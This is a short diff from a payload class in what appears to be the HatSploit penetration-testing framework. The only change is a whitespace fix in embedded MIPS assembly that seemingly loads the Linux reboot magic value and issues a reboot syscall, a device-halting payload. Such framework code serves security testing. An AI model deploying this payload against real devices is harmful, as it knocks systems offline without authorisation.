@@ -36,6 +36,6 @@ class HatSploitPayload(Payload, PayloadTools):
                 lui $a0, 0xfee1
                 ori $a0, $a0, 0xdead
                 addiu $v0, $zero, 0xff8
-                syscall	0x40404
+                syscall 0x40404
             """
         )
